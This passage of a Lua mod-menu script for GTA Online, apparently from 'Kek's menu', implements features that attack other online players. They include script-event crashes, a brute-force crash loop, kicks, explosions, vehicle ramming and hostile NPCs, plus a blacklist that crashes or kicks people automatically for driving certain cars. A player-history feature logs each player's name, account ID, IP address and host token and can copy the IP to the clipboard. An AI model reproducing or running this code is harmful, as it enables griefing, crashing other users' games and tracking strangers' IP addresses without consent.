							entity.set_entity_rotation(cars[car_i], cam.get_gameplay_cam_rot())
						end
					end
				end
			end
		end)

	-- Traffic drivers backward
		menu.add_feature(language["Backwards traffic /;/feature|_|"], "toggle", u.vehicle_trolling.id, function(f)
			while f.on do
				system.yield(0)
				local peds = get_table_of_entities_with_respect_to_distance_and_set_limit
				(
					{
						{
							get_table_of_close_entity_type(2),
							nil,
							true
						}
					},
					get_ped_closest_to_your_pov()
				)
				for i, driver in pairs(peds) do
					if ped.is_ped_in_any_vehicle(driver) and get_control_of_entity(driver) then
						ai.task_vehicle_drive_wander(driver, ped.get_vehicle_ped_is_using(driver), 120, 787968)
					end
					if not f.on then
						break
					end
				end
			end
		end)

	-- Ram everyone loop
		menu.add_feature(language["Ram everyone /;/feature|_|"], "toggle", u.vehicle_trolling.id, function(f)
			while f.on do
				local e, me = {}, player.player_id()
				for pid = 0, 31 do
					if player.is_player_valid(pid) and (not network.is_scid_friend(player.get_player_scid(pid)) or not setting["Exclude friends from attacks #malicious#"]) and not player.is_player_god(pid) and pid ~= me then
						e[#e + 1] = spawn_and_push_a_vehicle_in_direction(pid, false, 8, vehicle_mapper.GetHashFromModel(txt.what_vehicle_model_in_use), v3())
					end
				end
				system.yield(350)
				clear_entities(e)
			end
		end)

		menu.add_feature(language["Disable vehicles /;/feature|_|"], "toggle", u.vehicle_trolling.id, function(f)
			while f.on do
				local me = player.player_id()
				for pid = 0, 31 do
					if not player.is_player_in_any_vehicle(me) or player.get_player_vehicle(pid) ~= player.get_player_vehicle(me) then
						disable_vehicle(pid, true)
					end
					system.yield(0)
				end
				system.yield(2500)
			end
		end)

		menu.add_feature(language["Vehicle storm /;/feature|_|"], "toggle", u.vehicle_trolling.id, function(f)
			while f.on do
				system.yield(0)
				local cars = get_table_of_entities_with_respect_to_distance_and_set_limit
				(
					{
						{
							get_table_of_close_entity_type(1),
							45,
							true
						}
					},
					get_ped_closest_to_your_pov()
				)
				while f.on and #cars > 15 do
					system.yield(0)
					for i =  1, #cars do
						if entity.is_an_entity(cars[i]) then
							network.request_control_of_entity(cars[i])
							if network.has_control_of_entity(cars[i]) then
								entity.set_entity_max_speed(cars[i], 45000)
								entity.set_entity_rotation(cars[i], v3(math.random(0, 360), math.random(0, 360), math.random(0, 360)))
								vehicle.set_vehicle_forward_speed(cars[i], math.random(-1000, 1000))
								entity.apply_force_to_entity(cars[i], 3, math.random(-4, 4), math.random(-4, 4),math.random(-1, 5), 0, 0, 0, true, true)
							end
						else
							table.remove(cars, i)
							break
						end
					end
				end
			end
		end)

-- Initialize player history
	local player_history = {}
	player_history.year_parents = {}
	player_history.month_parents = {}
	player_history.day_parents = {}
	player_history.hour_parents = {}
	player_history.searched_players = {}
	player_history.player_properties = {}

	-- Functions for player history
		function player_history.add_features(parent, rid, ip, name, host_token)
			menu.add_feature(language["Add player / modify reason they were added /;/feature|_|"], "action", parent.id, function()
				add_to_blacklist(name, ipv4_to_dec(ip), rid, host_token, get_input(language["Type in why you're adding this person. Typing in nothing makes the reason: Manually added. /;/input_does_not_support_unicode|_|"], "", 128, 0), true)
				for pid = 0, 31 do
					if rid == player.get_player_scid(pid) then
						player.set_player_as_modder(pid, keks_custom_modder_flags[3][1])
						break
					end
				end
			end)
			menu.add_feature (language["Remove player from blacklist /;/feature|_|"], "action", parent.id, function()
				remove_from_blacklist(name, ipv4_to_dec(ip), rid, host_token, true)
			end)
			menu.add_feature (language["Copy rid to clipboard /;/feature|_|"], "action", parent.id, function()
				utils.to_clipboard(rid)
			end)

			menu.add_feature (language["Copy ip to clipboard /;/feature|_|"], "action", parent.id, function()
				utils.to_clipboard(ip)
			end)
			return HANDLER_CONTINUE
		end

		function player_history.get_date()
			local day_num = tonumber(os.date("%d"))
			if day_num == 1 then
				day_num = "1st"
			elseif day_num == 2 then
				day_num = "2nd"
			elseif day_num == 3 then
				day_num = "3rd"
			else
				day_num = day_num.."th"
			end
			local month = os.date("%B").."_".. os.date("%m")
			local day = os.date("%A").." "..day_num.." of "..month:match("(.*)_")
			local year = os.date("%Y")
			local time = os.date("%H").." o'clock"
			local date = os.date("%x")
			return month, day, year, time, date
		end

		function player_history.check_if_blank(name, rid, ip, host_token, time, date)
			local is_info_blank = true
			if not name then
				name = ""
			else
				is_info_blank =  false
			end
			if not rid then
				rid = ""
			else
				is_info_blank =  false
			end
			if not ip then
				ip = ""
			else
				is_info_blank =  false
			end
			if not host_token then
				host_token = ""
			else
				is_info_blank = false
			end
			if not time then
				time = ""
			end
			if not date then
				date = ""
			end
			return name, rid, ip, host_token, time, date, is_info_blank
		end

	-- Player history
		temp.load_history = menu.add_feature("", "action", 0, function(f)
			f.hidden = true
			for year_index, year in pairs(table.sort_numbers(utils.get_all_sub_directories_in_directory(o.kek_menu_stuff_path.."\\Player history"))) do
				player_history.year_parents[year] = menu.add_feature(year, "parent", u.player_history.id)
				system.yield(0)
				for month_index, month in pairs(table.sort_numbers(utils.get_all_sub_directories_in_directory(o.kek_menu_stuff_path.."\\Player history\\"..year))) do
					player_history.month_parents[year..month] = menu.add_feature(string.gsub(month:gsub("_", " "), "%d", ""), "parent", player_history.year_parents[year].id)
					system.yield(0)
					for day_index, day in pairs(table.sort_numbers(utils.get_all_sub_directories_in_directory(o.kek_menu_stuff_path.."\\Player history\\"..year.."\\"..month))) do
						player_history.day_parents[year..month..day] = menu.add_feature(day, "parent", player_history.month_parents[year..month].id)
						system.yield(0)
						for file_index, current_file in pairs(table.sort_numbers(utils.get_all_files_in_directory(o.kek_menu_stuff_path.."\\Player history\\"..year.."\\"..month.."\\"..day, "log"))) do
							player_history.hour_parents[year..month..day..current_file:gsub(".log", "")] = menu.add_feature(current_file:gsub(".log", ""), "parent", player_history.day_parents[year..month..day].id)
							system.yield(0)
							for player_info in string.get_lines_reversed("scripts\\kek_menu_stuff\\Player history\\"..year.."\\"..month.."\\"..day.."\\"..current_file):gmatch("([^\n]*)\n?") do
								random_wait(30)
								if #player_history.player_properties > valuei["History limit"][2].value_i then
									player_history.is_loaded = true
									return 
								end
								local name, rid, ip, host_token, time, date, is_info_blank = player_history.check_if_blank(player_info:match("|(.*)|"), player_info:match(" &(.*)&"), player_info:match("^(.*)^"), player_info:match("§(.*)§"), player_info:match("!(.*)!"), player_info:match("<(.*)>"))
								if not is_info_blank then
									player_history.player_properties[#player_history.player_properties + 1] = menu.add_feature(name.." ["..time.."]", "parent", player_history.hour_parents[year..month..day..current_file:gsub(".log", "")].id)
									player_history.add_features(player_history.player_properties[#player_history.player_properties], rid, ip, name, host_token)
								end
							end
						end
					end
				end
			end
			player_history.is_loaded = true
		end)
		temp.load_history.on = true

		menu.add_feature(language["Please click me for info /;/feature|_|"], "action", u.player_history.id, function()
			msg(language["Num of people, click to type, means how many people are shown in the player history. /;/msg|_|"], 6, true)
			msg(language["The higher it is, the longer the freeze when reseting lua state becomes. Default value is safe. /;/msg|_|"], 6, true)
		end)

		valuei["History limit"] = {"History limit", menu.add_feature(language["Num of people, click to type /;/feature|_|"], "autoaction_value_i", u.player_history.id, function(f)
			if controls.is_disabled_control_pressed(0, 215) then
				local v = get_input(language["Type in history limit. /;/input_does_not_support_unicode|_|"], "", 7, 0, setting["History limit"])
				value_i_setup(f, v)
			end
			setting["History limit"] = f.value_i
		end)}
		valuei["History limit"][2].max_i, valuei["History limit"][2].min_i, valuei["History limit"][2].mod_i = 10000, 1, 1

		toggle[#toggle + 1] = {"Player history", menu.add_feature(language["Player history /;/feature|_|"], "toggle", u.player_history.id, function(f)
			setting["Player history"] = true
			while not player_history.is_loaded do
				system.yield(100)
			end
			local players_added_to_history = {}
			while f.on do
				local month, day, year, time, date = player_history.get_date()
				time_to_log = os.date("%X")
				local file_path = o.kek_menu_stuff_path.."\\Player history\\"..year.."\\"..month.."\\"..day.."\\"..time..".log"
				if not utils.dir_exists(o.kek_menu_stuff_path.."Player history\\"..year) then
					utils.make_dir(o.kek_menu_stuff_path.."Player history\\"..year)
				end
				if not player_history.year_parents[year] then
					player_history.year_parents[year] = menu.add_feature(year, "parent", u.player_history.id)
				end
				if not utils.dir_exists(o.kek_menu_stuff_path.."Player history\\"..year.."\\"..month) then
					utils.make_dir(o.kek_menu_stuff_path.."Player history\\"..year.."\\"..month)
				end
				if not player_history.month_parents[year..month] then
					player_history.month_parents[year..month] = menu.add_feature(string.gsub(month:gsub("_", " "), "%d", ""), "parent", player_history.year_parents[year].id)
				end

				if not utils.dir_exists(o.kek_menu_stuff_path.."Player history\\"..year.."\\"..month.."\\"..day) then
					utils.make_dir(o.kek_menu_stuff_path.."Player history\\"..year.."\\"..month.."\\"..day)
				end
				if not player_history.day_parents[year..month..day] then
					player_history.day_parents[year..month..day] = menu.add_feature(day, "parent", player_history.month_parents[year..month].id)
				end

				if not utils.file_exists(file_path) then
					local file = io.open(file_path, "w+")
					file:flush()
					file:close()
				end
				if not player_history.hour_parents[year..month..day..time] then
					player_history.hour_parents[year..month..day..time] = menu.add_feature(time, "parent", player_history.day_parents[year..month..day].id)
				end
				for pid = 0, 31 do
					if player.is_player_valid(pid) and pid ~= player.player_id() and not players_added_to_history[player.get_player_scid(pid)] then
						system.yield(0)
						local token = dec_to_hex(player.get_player_host_token(pid))
						local name, rid, ip, host_token = player.get_player_name(pid), player.get_player_scid(pid), get_ip_in_ipv4(pid), token:sub(math.min(1, #token), math.min(8, #token))
						if name and rid and ip then
							local player_info = name.." ["..time_to_log.."]"
							local info_to_log = "|"..name.."| &"..rid.."& §"..host_token.."§ ^"..ip.."^".." !"..time_to_log.."!".." <"..date..">"
							local path = "scripts\\kek_menu_stuff\\Player history\\"..year.."\\"..month.."\\"..day
							local log_path = file_path:gsub(o.home, "")
							local no_duplicates_found = true
							for hour_index, hour in pairs(table.sort_numbers(utils.get_all_files_in_directory(o.home..path, "log"))) do
								system.yield(200)
								if search_for_match_and_get_line(path.."\\"..hour, {ip, rid, host_token}) then
									no_duplicates_found = false
									players_added_to_history[rid] = true
									break
								end
							end
							if no_duplicates_found then
								system.yield(200)
								log(log_path, info_to_log)
								player_history.player_properties[#player_history.player_properties + 1] = menu.add_feature(player_info, "parent", player_history.hour_parents[year..month..day..time].id)
								system.yield(0)
								player_history.add_features(player_history.player_properties[#player_history.player_properties], rid, ip, name, host_token)
								log("scripts\\kek_menu_stuff\\kekMenuLogs\\All players.log", info_to_log)
								players_added_to_history[rid] = true
							end
						end
					end
				end
				system.yield(2000)
			end
			setting["Player history"] = false
		end)}

	-- Clear searched players
		menu.add_feature(language["Clear searched player list /;/feature|_|"], "action", u.player_history.id, function()
			for i, k in pairs(player_history.searched_players) do
				k.hidden = true
			end
		end)

	-- Search in player history
		menu.add_feature(language["Search (all players ever met) /;/feature|_|"], "action", u.player_history.id, function()
			local input = get_input(language["Type in what player you wanna search for. rid / name / ip /;/input_does_not_support_unicode|_|"], "", 128, 0):lower()
			if #input > 0 then
				local str = string.get_lines_reversed("scripts\\kek_menu_stuff\\kekMenuLogs\\All players.log", "*a")
				for player_info in str:gmatch("([^\n]*)\n?") do
					random_wait(210)
					if string.replace_special_characters(player_info):lower():match(string.replace_special_characters(input):lower()) then
						local name, rid, ip, host_token, time, date = player_history.check_if_blank(player_info:match("|(.*)| "), player_info:match(" &(.*)&"), player_info:match(" ^(.*)^"), player_info:match("§(.*)§"), player_info:match(" !(.*)!"), player_info:match(" <(.*)>"))
						player_history.searched_players[#player_history.searched_players + 1] = menu.add_feature(name.." ["..date.." "..time.."]", "parent", u.player_history.id)
						player_history.add_features(player_history.searched_players[#player_history.searched_players], rid, ip, name, host_token)
						return
					end
				end
				msg(language["Couldn't find player. /;/msg|_|"], 6, true)
			else
				msg(language["Input too short. /;/msg|_|"], 6, true)
			end			
		end)

-- Player malicious
	-- Script event crash
		menu.add_player_feature(language["Script event crash /;/player feature|_|"], "action", u.pMalicious, function(f, pid)
			script_event_crash(pid) 
			if setting["Auto tag modders after sending kick #malicious#"] then
				system.yield(500)
				player.set_player_as_modder(pid, keks_custom_modder_flags[2][1])
			end
		end)

	-- Brute force crash
		menu.add_player_feature(language["Brute force crash /;/player feature|_|"], "toggle", u.pMalicious, function(f, pid)
			if player.player_id() == pid then 
				f.on = false
				return
			end
			while f.on do
				system.yield(0)
				for i = 1, 100 do
					send_script_event(kick_script_events[math.random(1, #kick_script_events)], pid, get_full_arg_table(pid))
					system.yield(0)
					if not f.on then
						break
					end
				end
				for i = 1, 100 * #kick_script_events / #crash_script_events do
					send_script_event(crash_script_events[math.random(1, #crash_script_events)], pid, get_full_arg_table(pid))
					system.yield(0)
					if not f.on then
						break
					end
				end
			end
		end)

	-- Give host
		menu.add_player_feature(language["Give them host /;/player feature|_|"], "toggle", u.pMalicious, function(f, pid)
			if player.get_player_host_priority(player.player_id()) > player.get_player_host_priority(pid) then
				local me = player.player_id()
				while f.on and player.get_host() ~= pid and me == player.player_id() do
					system.yield(0)
					local nothing, friends = get_host(pid)
					if friends then
						break
					end
				end
			else
				msg(language["Your host priority is lower than theirs. Cancelled. /;/msg|_|"], 6, true)
			end
			f.on = false
		end)

	-- Kick
		menu.add_player_feature(language["Kick player /;/player feature|_|"], "action", u.pMalicious, function(f, pid) 
			kick(pid) 
			if player.is_player_valid(pid) and setting["Auto tag modders after sending kick #malicious#"] then
				system.yield(500)
				player.set_player_as_modder(pid, keks_custom_modder_flags[2][1])
			end
		end)

-- Session
	-- Vehicle blacklist
		menu.add_feature(language["Add entry vehicle blacklist /;/feature|_|"], "action", u.vehicle_blacklist.id, function()
			local text = get_input(language["Type in what to add. /;/input_does_not_support_unicode|_|"], "", 128, 0)
			if #text == 0 then
				msg(language["Entry is too short. /;/msg|_|"], 6, true)
				return
			end
			msg(language["1 = EMP\\n2 = Kick out\\n3 = Kick out & destroy personal vehicle\\n4 = Explode\\n5 = Ram with tankers /;/msg|_|"], 140, true)
			msg(language["6 = Glitch their vehicle\\n7 = Kick\\n8 = Crash\\n0 = random reaction(not kick or crash) /;/msg|_|"], 140, true)
			local reaction = get_input(language["Type in what reaction. NUMBER, 0 to 8 /;/input_does_not_support_unicode|_|"], "", 1, 3)
			reaction = tonumber(reaction)
			if not reaction or reaction < 0 or reaction > 8 then
				reaction = 3
			end
			local hash, valid = vehicle_mapper.GetHashFromModel(text)
			local name_of_vehicle = vehicle_mapper.GetModelFromHash(hash)
			if valid then
				local result = log("scripts\\kek_menu_stuff\\kekMenuData\\vehicle_blacklist.txt", "|"..hash.."| &"..name_of_vehicle.."&".." <"..reaction..">", {hash})
				if not result then
					msg(language["Added /;/msg|_|"].." "..name_of_vehicle..".", 212, true)
					temp.update_vehicle_blacklist = true
				elseif reaction ~= tonumber(result:match("<(.*)>")) then
					modify_entry("scripts\\kek_menu_stuff\\kekMenuData\\vehicle_blacklist.txt", {result, "|"..hash.."| &"..name_of_vehicle.."&".." <"..reaction..">"}, true, true)
					temp.update_vehicle_blacklist = true
					msg(language["Modified reaction in existing entry. /;/msg|_|"], 212, true)
				else
					msg(language["Nothing was changed, same reaction as it previously was. /;/msg|_|"], 212, true)
				end
			else
				msg(language["Invalid entry. /;/msg|_|"], 6, true)
			end
		end)

		menu.add_feature(language["Remove entry vehicle blacklist /;/feature|_|"], "action", u.vehicle_blacklist.id, function()
			local text = get_input(language["Type in what to remove. /;/input_does_not_support_unicode|_|"], "", 128, 0)
			if #text == 0 then
				msg(language["Entry is too short. /;/msg|_|"], 6, true)
				return
			end
			local hash = vehicle_mapper.GetHashFromModel(text)
			text = vehicle_mapper.GetModelFromHash(hash)
			if modify_entry("scripts\\kek_menu_stuff\\kekMenuData\\vehicle_blacklist.txt", {text}) == 1 then
				msg(language["Removed /;/msg|_|"].." "..text, 212, true)
				temp.update_vehicle_blacklist = true
			else 
				msg(language["Couldn't find entry. /;/msg|_|"], 6, true)
			end
		end)

		menu.add_feature(language["Empty vehicle blacklist /;/feature|_|"], "action", u.vehicle_blacklist.id, function()
			local file = io.open(o.kek_menu_stuff_path.."kekMenuData\\vehicle_blacklist.txt", "w+")
			file:close()
			msg(language["Emptied vehicle blacklist. /;/msg|_|"], 140, true)
			temp.update_vehicle_blacklist = true
		end)

		toggle[#toggle + 1] = {"Vehicle blacklist apply only on specific players", menu.add_feature(language["Vehicle blacklist only on selected players /;/feature|_|"], "toggle", u.vehicle_blacklist.id, function(f)
			if f.on then
				find_and_toggle_on_or_off_toggle("Vehicle blacklist", true)
				setting["Vehicle blacklist apply only on specific players"] = true
			else
				setting["Vehicle blacklist apply only on specific players"] = false
			end
		end)}

		toggle[#toggle + 1] = {"Vehicle blacklist", menu.add_feature(language["Vehicle blacklist /;/feature|_|"], "toggle", u.vehicle_blacklist.id, function(f)
			setting["Vehicle blacklist"] = true
			local str = get_file_string("scripts\\kek_menu_stuff\\kekMenuData\\vehicle_blacklist.txt", "*a")
			local recently_activated_blacklist = {}
			while f.on do
				local me = player.player_id()
				if temp.update_vehicle_blacklist then
					str = get_file_string("scripts\\kek_menu_stuff\\kekMenuData\\vehicle_blacklist.txt", "*a")
					temp.update_vehicle_blacklist = false
				end
				for pid = 0, 31 do
					system.yield(50)
					if me ~= pid and not player.is_player_modder(pid, -1) and (not setting["Exclude friends from attacks #malicious#"] or not network.is_scid_friend(player.get_player_scid(pid))) and player.is_player_in_any_vehicle(pid) and (not setting["Vehicle blacklist apply only on specific players"] or selected_players_for_vehicle_blacklist[player.get_player_scid(pid)]) then
						if their_car == player.get_player_vehicle(me) then
							break
						end
						local their_car = player.get_player_vehicle(pid)
						local hash = entity.get_entity_model_hash(their_car)
						local name = player.get_player_name(pid)
						for vehicle_entry in str:gmatch("([^\n]*)\n?") do
							system.yield(0)
							if vehicle_entry:match("|(.*)|") == tostring(hash) and (not recently_activated_blacklist[their_car] or recently_activated_blacklist[their_car] < utils.time_ms()) then
								recently_activated_blacklist[their_car] = utils.time_ms() + 12000
								local what_reaction = tonumber(vehicle_entry:match("<(.*)>"))
								if what_reaction == 0 then
									what_reaction = math.random(1, 6)
								end
								local pos = player.get_player_coords(pid)
								if what_reaction == 1 then
									send_script_event(-152440739, pid, {pid, math.round(pos.x), math.round(pos.y), math.round(pos.z), 0})
									msg(language["Vehicle blacklist:\\nEMP'd /;/msg|_|"].." "..name.."'s' "..vehicle_mapper.GetNameFromHash(hash)..".", 140, setting["Vehicle blacklist #notifications#"])
								elseif what_reaction == 2 then
									send_script_event(-1662268941, pid, {pid, pid})
									msg(language["Vehicle blacklist:\\nKicked /;/msg|_|"].." "..name.." "..language["out of their /;/msg|_|"].." "..vehicle_mapper.GetNameFromHash(hash)..".", 140, setting["Vehicle blacklist #notifications#"])
								elseif what_reaction == 3 then
									disable_vehicle(pid)
									msg(language["Vehicle blacklist:\\nKicked /;/msg|_|"].." "..name.." "..language["out of their /;/msg|_|"].." "..vehicle_mapper.GetNameFromHash(hash)..".", 140, setting["Vehicle blacklist #notifications#"])
								elseif what_reaction == 4 then
									local pids = {}
									for Pid = 0, 31 do
										if player.is_player_valid(pid) and me ~= Pid and pid ~= Pid then
											pids[#pids + 1] = Pid
										end
									end
									if #pids == 0 then
										pids[1] = pid
									end
									local their_ped = player.get_player_ped(pids[math.random(1, #pids)])
									msg(language["Vehicle blacklist:\\nExploding /;/msg|_|"].." "..name.."'s' "..vehicle_mapper.GetNameFromHash(hash)..".", 140, setting["Vehicle blacklist #notifications#"])
									for i = 1, 20 do
										system.yield(0)
										if entity.is_entity_dead(their_car) then
											break
										end
										fire.add_explosion(player.get_player_coords(pid), math.random(0, 74), true, false, 0, their_ped)
									end
								elseif what_reaction == 5 then
									msg(language["Vehicle blacklist:\\nRamming /;/msg|_|"].." "..name.."'s' "..vehicle_mapper.GetNameFromHash(hash)..".", 140, setting["Vehicle blacklist #notifications#"])
									local time = utils.time_ms() + 5000
									while time > utils.time_ms() do
										spawn_and_push_a_vehicle_in_direction(pid, true, 8, 3564062519, v3())
										system.yield(100)
									end
								elseif what_reaction == 6 then
									glitch_vehicle(player.get_player_ped(pid))
									msg(language["Vehicle blacklist:\\nGlitching /;/msg|_|"].." "..name.."'s' "..language["for using /;/msg|_|"].." "..vehicle_mapper.GetNameFromHash(hash)..".", 140, setting["Vehicle blacklist #notifications#"])
								elseif what_reaction == 7 then
									kick(pid)
									msg(language["Vehicle blacklist:\\nKicked /;/msg|_|"].." "..name.." "..language["for using /;/msg|_|"].." "..vehicle_mapper.GetNameFromHash(hash)..".",140, setting["Vehicle blacklist #notifications#"])
								elseif what_reaction == 8 then
									script_event_crash(pid)
									msg(language["Vehicle blacklist:\\nCrashed /;/msg|_|"].." "..name.." "..language["for using /;/msg|_|"].." "..vehicle_mapper.GetNameFromHash(hash)..".",140, setting["Vehicle blacklist #notifications#"])
								end
								break
							end
							system.yield(0)
						end
					end
				end
				system.yield(0)
			end
			setting["Vehicle blacklist"] = false
		end)}

		menu.add_player_feature(language["Vehicle blacklist on this player /;/player feature|_|"], "toggle", u.player_vehicle_features, function(f, pid)
			if f.on then
				selected_players_for_vehicle_blacklist[player.get_player_scid(pid)] = true
				find_and_toggle_on_or_off_toggle("Vehicle blacklist", true)
				find_and_toggle_on_or_off_toggle("Vehicle blacklist apply only on specific players", true)
			else
				selected_players_for_vehicle_blacklist[player.get_player_scid(pid)] = nil
			end
		end)

		menu.add_player_feature(language["Get model name of their car to clipboard /;/player feature|_|"], "action", u.player_vehicle_features, function(f, pid)
			if player.is_player_in_any_vehicle(pid) then
				local model_name = vehicle_mapper.GetModelFromHash(entity.get_entity_model_hash(player.get_player_vehicle(pid)))
				utils.to_clipboard(model_name)
				msg(language["Copied /;/msg|_|"].." "..model_name.." "..language["to clipboard. /;/msg|_|"], 212, true)
			else
				msg(language["Player isn't in a vehicle. /;/msg|_|"], 6, true)
			end
		end)

	-- Spawn a vehicle for everyone
		menu.add_feature(language["What to ram people with /;/feature|_|"], "action", u.vehicle_trolling.id, function()
			txt.what_vehicle_model_in_use = get_input(language["Type in which car to ram people with. /;/input_does_not_support_unicode|_|"], "", 128, 0, setting["Default vehicle"]):lower() 
		end)

		menu.add_feature(language["Spawn vehicle for everyone /;/feature|_|"], "action", u.vehicle_friendly.id, function()
			local me = player.player_id()
			local hash = vehicle_mapper.GetHashFromModel(get_input(language["Type in which car to spawn /;/input_does_not_support_unicode|_|"], "", 128, 0, setting["Default vehicle"]):lower())
			clear_entities(get_table_of_close_entity_type(1))
			for pid = 0, 31 do
				local p_pos = player.get_player_coords(pid)
				if player.is_player_valid(pid) and not player.is_player_in_any_vehicle(pid) and not player.is_player_god(pid) and pid ~= me and p_pos.z > -20 then
					local car = spawn_entity(hash, get_vector_relative_to_entity(player.get_player_ped(pid), 5), player.get_player_heading(pid), setting["Spawn #vehicle# maxed"], setting["Spawn #vehicle# in godmode"])
					decorator.decor_set_int(car, "MPBitset", 1 << 10)
				end
			end
			msg(language["Cars spawned. /;/msg|_|"], 140, true)
		end)

	-- Teleport all personal vehicles to you
		menu.add_feature(language["Teleport nearby personal vehicles /;/feature|_|"], "toggle", u.vehicle_trolling.id, function(f)
			while f.on do
				local me = player.player_id()
				system.yield(0)
				for pid = 0, 31 do
					if player.is_player_valid(pid) and globals.get_player_personal_vehicle(pid) ~= 0 and (not setting["Exclude friends from attacks #malicious#"] or not network.is_scid_friend(player.get_player_scid(pid))) then
						local PID = pid + 1
						local personal_vehicle = globals.get_player_personal_vehicle(pid)
						if ped.is_ped_in_vehicle(player.get_player_ped(pid), personal_vehicle) then
							send_script_event(-1333236192, pid, {pid, 0, 0, 0, 0, 1, pid, gameplay.get_frame_count()})
							ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
						end
						network.request_control_of_entity(personal_vehicle)
						if network.has_control_of_entity(personal_vehicle) and not ped.is_ped_in_vehicle(player.get_player_ped(pid), personal_vehicle) then
							entity.set_entity_collision(personal_vehicle, false, false, false)
							local pos, rot = player.get_player_coords(me), cam.get_gameplay_cam_rot()
					        rot:transformRotToDir()
							pos = pos + rot * 10
							entity.set_entity_coords_no_offset(personal_vehicle, pos)
						end
					end
				end
			end
			for pid = 0, 31 do
				if player.is_player_valid(pid) and globals.get_player_personal_vehicle(pid) ~= 0 then
					entity.set_entity_collision(globals.get_player_personal_vehicle(pid), true, true, false)
				end
			end
		end)

	-- Max everyone's car
		menu.add_feature(language["Max everyone's car /;/feature|_|"], "action", u.vehicle_friendly.id, function()
			local me = player.player_id()
			local pos = player.get_player_coords(me)
			for pid = 0, 31 do
				if is_target_viable(pid) then
					max_car(player.get_player_vehicle(pid))
				end
			end
			if player.is_player_in_any_vehicle(me) then
				entity.set_entity_coords_no_offset(player.get_player_vehicle(me), pos)
			else
				entity.set_entity_coords_no_offset(player.get_player_ped(me), pos)
			end
			msg(language["Maxed everyone's cars. /;/msg|_|"], 212, true)
		end)	


	-- Teleportation
		-- Teleport function
			local function teleport_player_and_vehicle_to_waypoint(pid, pos, teleport_you_back_to_original_pos, is_show_message, is_a_toggle, f)
				if type(pos) ~= "userdata" or pos.x > 14000 then
					return
				end
				local me = player.player_id()
				local initial_pos = player.get_player_coords(me)
				local Ped = player.get_player_ped(me)
				if is_target_viable(pid, is_a_toggle, f) then
					local time = utils.time_ms() + 1250
					local car = player.get_player_vehicle(pid)
					for i = 1, 3000 do
						teleport(car, pos + v3(0, 0, 3))
						temp.nothing, pos.z = gameplay.get_ground_z(player.get_player_coords(pid))
						if utils.time_ms() > time then
							break 
						end
						system.yield(0)
					end
				elseif is_show_message then
					msg(player.get_player_name(pid).." "..language["is not in a vehicle. /;/msg|_|"], 6, true)
				end
				if teleport_you_back_to_original_pos then
					if get_distance_between(player.get_player_coords(player.player_id()), initial_pos) > 150 then
						if player.is_player_in_any_vehicle(me) then
							entity.set_entity_coords_no_offset(player.get_player_vehicle(me), initial_pos)
						else
							entity.set_entity_coords_no_offset(Ped, initial_pos) 
						end
					end
				end
			end

		-- Teleport player to position
			local function teleport_player_and_vehicle_to_position(pid, pos, teleport_you_back_to_original_pos, is_show_message, is_a_toggle, f)
				if type(pos) ~= "userdata" then
					return
				end
				local me = player.player_id()
				local Ped = player.get_player_ped(me)
				local initial_pos = player.get_player_coords(me)
				if is_target_viable(pid, is_a_toggle, f) then
					local time = utils.time_ms() + 1250
					local car = player.get_player_vehicle(pid)
					for i = 1, 3000 do
						teleport(car, pos)
						if utils.time_ms() > time then
							break 
						end
						system.yield(0)
					end
				elseif is_show_message then
					msg(player.get_player_name(pid).." "..language["is not in a vehicle. /;/msg|_|"], 6, true)
				end
				if teleport_you_back_to_original_pos then
					if get_distance_between(player.get_player_coords(player.player_id()), initial_pos) > 150 then
						if player.is_player_in_any_vehicle(me) then
							entity.set_entity_coords_no_offset(player.get_player_vehicle(me), initial_pos)
						else
							entity.set_entity_coords_no_offset(Ped, initial_pos) 
						end
					end
				end
			end

	-- Teleport player & vehicle
		menu.add_player_feature(language["Teleport player & vehicle to waypoint /;/player feature|_|"], "action", u.player_vehicle_features, function(f, pid)
			if ui.get_waypoint_coord().x > 14000 then
				msg(language["Please set a waypoint. /;/msg|_|"], 6, true)
				return
			end
			local pos = ui.get_waypoint_coord()
			local pos = v3(pos.x, pos.y, 1000)
			teleport_player_and_vehicle_to_waypoint(pid, pos, true, true)
		end)

	-- Teleport to me
		menu.add_player_feature(language["Teleport player & vehicle to you /;/player feature|_|"], "action", u.player_vehicle_features, function(f, pid)
			if player.player_id() == pid then
				msg(language["No need to teleport yourself to yourself. /;/msg|_|"], 6, true)
				return
			end
			teleport_player_and_vehicle_to_position(pid, get_vector_relative_to_entity(player.get_player_ped(player.player_id()), 8), true, true)
		end)

	-- Dump world on player
		menu.add_player_feature(language["Dump world /;/player feature|_|"], "action", u.player_trolling_features, function(f, pid)
			local entities = get_table_of_entities_with_respect_to_distance_and_set_limit
				(
					{
						{
							get_table_of_close_entity_type(1),
							40,
							true
						},
						{
							get_table_of_close_entity_type(2),
							40,
							true
						},
						{
							get_table_of_close_entity_type(3),
							35,
							false,
							200
						}
					},
					player.get_player_ped(pid)
				)
			local entities_to_not_dump = vehicle_mapper.get_vehicles_from_certain_index(670, 708)
			for i = 1, #entities do
				local hash = entity.get_entity_model_hash(entities[i])
				if not table.get_index_of_value(entities_to_not_dump, hash) then
					network.request_control_of_entity(entities[i])
					local pos = player.get_player_coords(pid)
					if pos.z < -20 then
						pos.z = math.abs(pos.z) + 80
					end
					pos = pos + v3(math.random(-8, 8), math.random(-8, 8), math.random(0, 20))
					local their_entity = player.get_player_ped(pid)
					if player.is_player_in_any_vehicle(pid) then
						their_entity = player.get_player_vehicle(pid)
					end
					if network.has_control_of_entity(entities[i]) then
						entity.set_entity_coords_no_offset(entities[i], pos + entity.get_entity_velocity(their_entity))
					end
				end
			end
			system.yield(500)
		end)

	-- Make nearby peds hostile
		menu.add_player_feature(language["Make nearby peds hostile /;/player feature|_|"], "toggle", u.player_trolling_features, function(f, pid)
			local weapons = table.merge(weapon_mapper.get_table_of_rifles(), {weapon_mapper.get_table_of_smgs(), weapon_mapper.get_table_of_heavy_weapons(), weapon_mapper.get_table_of_throwables()})
			local peds
			while f.on do
				system.yield(0)
				peds = get_table_of_entities_with_respect_to_distance_and_set_limit
				(
					{
						{
							get_table_of_close_entity_type(2),
							40,
							true
						}	
					},
					player.get_player_ped(pid)
				)
				table.sort(peds, function(a, b) return (get_distance_between(a, player.get_player_ped(pid)) > get_distance_between(b, player.get_player_ped(pid))) end)
				for i, Ped in pairs(peds) do
					if entity.get_entity_model_hash(Ped) ~= 0x04498DDE and get_control_of_entity(Ped, 100) then
						weapon.give_delayed_weapon_to_ped(Ped, weapons[math.random(1, #weapons)], 0, 1)
						set_combat_attributes(Ped, false, true, true)
						ai.task_combat_ped(Ped, player.get_player_ped(pid), 0, 16)
						system.yield(75)
